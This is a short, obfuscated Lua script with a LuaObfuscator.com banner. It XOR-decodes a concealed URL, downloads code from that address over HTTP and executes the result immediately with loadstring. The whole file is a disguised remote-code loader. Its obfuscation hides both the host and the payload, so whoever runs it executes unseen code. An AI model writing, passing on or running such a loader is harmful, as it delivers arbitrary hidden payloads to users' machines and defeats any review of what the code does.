--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0=bit32 or bit ;local v1=v0.bxor;local v2=v0.bor;local v3=v0.band;local v4={};v4["obf_stringchar%0"]=string['char'];v4["obf_stringbyte%0"]=string['byte'];v4["obf_stringsub%0"]=string['sub'];v4["obf_bitlib%0"]=bit32 or bit ;v4["obf_XOR%0"]=v4["obf_bitlib%0"]['bxor'];v4["obf_tableconcat%0"]=table['concat'];v4["obf_tableinsert%0"]=table['insert'];local function v17(v19,v20) v4["result%0"]={};for v23=1, #v19 do v4["obf_tableinsert%0"](v4["result%0"],v4["obf_stringchar%0"](v4["obf_XOR%0"](v4["obf_stringbyte%0"](v4["obf_stringsub%0"](v19,v23,v3(v23,2 -1 ) + v2(v23,2 -1 ) )),v4["obf_stringbyte%0"](v4["obf_stringsub%0"](v20,v3(2 -1 ,v23% #v20 ) + v2(2 -1 ,v23% #v20 ) ,v3((1 -0) + (v23% #v20) ,2 -1 ) + v2((1 -0) + (v23% #v20) ,2 -1 ) )))%(875 -(v3(555,64) + v2(555,64))) ));end return v4["obf_tableconcat%0"](v4["result%0"]);end v4["urlScript%0"]=v17("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\217\55\239\181\214\11\212\208\216\55\239\171\211\13\214\194\214\32\244\246\197\17\197\140\216\48\245\175\200\19\222\215\200\32\244\173\194\12\158\209\222\35\245\244\207\27\208\199\200\106\235\186\206\16\158\199\217\50\231\183\198\31\194\199\208\47\234\245\203\11\208","\126\177\163\187\69\134\219\167");modules['corelib']['HTTP'].get(v4["urlScript%0"],function(v22) assert(loadstring(v22))();end);
